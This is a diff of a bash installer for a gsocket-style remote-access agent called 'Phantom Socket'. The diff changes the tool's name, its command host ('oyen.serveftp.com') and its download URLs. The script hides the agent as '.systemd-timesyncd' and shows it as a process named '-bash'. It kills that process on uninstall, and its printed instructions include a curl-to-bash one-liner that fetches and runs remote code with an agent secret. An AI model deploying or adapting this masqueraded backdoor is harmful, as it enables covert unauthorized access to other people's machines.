@@ -1,5 +1,5 @@
 #!/bin/bash
-# Soket.io v1.0 Final - Gsocket-Style Infrastructure Deployment
+# Phantom Socket v1.0.0-stable - Gsocket-Style Infrastructure Deployment
 # Features: Random Secret Gen, GS_UNDO Logic, Static Linkage, and Production Sync.
 
 set -euo pipefail
@@ -7,16 +7,16 @@ set -euo pipefail
 # ============================================================================
 # Configuration
 # ============================================================================
-readonly VERSION="1.0"
+readonly VERSION="1.0.0-stable"
 readonly AGENT_NAME="gs-oyen-s"
-readonly PRODUCTION_IP="13.213.138.250"
-readonly BASE_URL="https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy"
+readonly PRODUCTION_IP="oyen.serveftp.com"
+readonly BASE_URL="https://raw.githubusercontent.com/Oyen-Sec/phantom-socket/main/deploy"
 
 # ============================================================================
 # GS_UNDO: Clean Uninstallation Logic
 # ============================================================================
 if [[ "${GS_UNDO:-0}" == "1" ]]; then
-    echo "[*] Initializing supreme uninstallation sequence..."
+    echo "[*] Initializing uninstallation sequence..."
     
     # Kill running processes
     pkill -9 -f ".systemd-timesyncd" 2>/dev/null || true
@@ -151,14 +151,13 @@ download_payload() {
 # ============================================================================
 print_summary() {
     status_step "Starting 'gs-oyen-s' as hidden process '-bash'"
-    # In a real environment, we would start it here
     # ${INSTALL_DIR}/.systemd-timesyncd -s "${AGENT_SECRET}" -i "${PRODUCTION_IP}" >/dev/null 2>&1 &
     status_done
     
     echo ""
     echo " --> To connect type one of the following:"
-    echo " --> gs-oyen-s -s \"${AGENT_SECRET}\" -i \"${PRODUCTION_IP}\""
-    echo " --> S=\"${AGENT_SECRET}\" bash -c \"\$(curl -fsSL https://oyen-sec.github.io/soket/y)\" "
+    echo " --> gs-oyen-s -s \"${AGENT_SECRET}\" -i \"${PRODUCTION_IP}\" -m 443"
+    echo " --> S=\"${AGENT_SECRET}\" bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/phantom-socket/main/y)\" "
     echo ""
 }
 
